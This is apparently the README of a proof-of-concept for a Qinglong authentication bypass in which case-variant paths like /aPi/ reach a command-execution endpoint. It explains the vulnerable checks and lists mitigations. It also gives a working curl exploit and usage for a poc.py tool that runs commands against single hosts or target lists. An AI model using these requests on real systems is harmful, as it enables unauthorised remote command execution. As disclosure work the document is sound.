# Qinglong Auth Bypass to Command Execution

A proof-of-concept exploiting a path canonicalization / case-handling weakness in Qinglong API routing can allow an unauthenticated actor to reach a privileged command execution endpoint (`/api/system/command-run`) through case-variant paths.

If exposed over the network, this may result in **unauthenticated remote command execution**.

## Vulnerability

The bypass comes from an inconsistent case-sensitive check in auth logic, combined with case-insensitive route matching in Express.

### 1. Whitelist regex in `back/loaders/express.ts`
```ts
path: [...config.apiWhiteList, /^\/(?!api\/).*/]
```

This regex strictly checks lowercase `api`.  
Any path not starting with lowercase `/api/` can bypass the JWT check path.

### 2. Custom auth middleware uses strict lowercase prefix checks
```ts
if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
  return next();
}
```

The middleware also performs strict lowercase matching with `req.path.startsWith(...)`.  
So paths like `/API/...` do not match `/api/` and are directly allowed.

### 3. Express routing is case-insensitive by default
```ts
app.use(config.api.prefix, routes());
```

Even if auth checks reject only lowercase patterns, Express can still resolve `/API/...` to the same handler family as `/api/...` (default case-insensitive behavior), creating an auth bypass.

## Affected Versions
- Affected versions: **Prior to 2.20.1**
- Fixed version: **Pending**

## PoC 

```bash
curl -X PUT "http://localhost:5700/aPi/system/command-run" \
> -H "Content-Type: application/json" \
> -d '{"command": "id"}'
```
## Automation `poc.py`

- Detects Qinglong target (`/api/health`, `/api/system`)
- Tests known case-variant command-run paths
- Executes the command supplied by `-c` and reports response

Single target:
```bash
python3 poc.py -t <host:port_or_url> -c 'whoami'
```

Target list (JSON output format):
```bash
python3 poc.py -l targets.txt -c 'whoami' --json -o result.json
```
Result:
```bash
[*] Target: http://127.0.0.1:5700
[+] Qinglong detected (version: 2.20.0)

[+] RCE success via /aPi/system/command-run
root
```
```json
[
  {
    "target": "http://localhost:5700",
    "reachable": true,
    "version": "2.20.0",
    "rce": {
      "success": true,
      "path": "/aPi/system/command-run",
      "output": "root"
    }
  }
]
```

## Impact
Successful exploitation can allow:
- Remote command execution on the Qinglong host context
- Disclosure or modification of application/runtime data
- Potential lateral movement depending on host privileges and network design

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H - Critical 10.0

## Mitigation
- Upgrade to the fixed Qinglong release when available.
- Normalize URL paths before authorization checks.
- Enforce strict, case-consistent route handling in middleware and reverse proxies.
- Restrict management/API exposure to trusted networks only.
- Add regression tests for case-variant endpoint access.

## Reference

https://github.com/whyour/qinglong/issues/2934

## Disclamer
This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.
